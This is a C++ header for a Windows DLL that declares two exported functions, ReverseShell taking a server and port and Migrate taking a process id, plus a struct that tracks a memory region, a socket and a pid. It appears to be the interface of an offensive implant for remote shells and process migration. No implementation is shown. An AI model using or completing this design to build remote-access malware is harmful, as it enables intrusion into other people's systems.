#ifndef EXTERNAL_H_INCLUDED
#define EXTERNAL_H_INCLUDED

#include <cstdint>
#include <windows.h>

extern "C" __declspec(dllexport) void ReverseShell(const char *server, const char *port);
extern "C" __declspec(dllexport) void Migrate(uint32_t pid);

struct DllMeta_ {
    void   *where;
    size_t size;
    struct {
        SOCKET   sock;
        uint32_t pid;
    } next;
};

#endif//EXTERNAL_H_INCLUDED
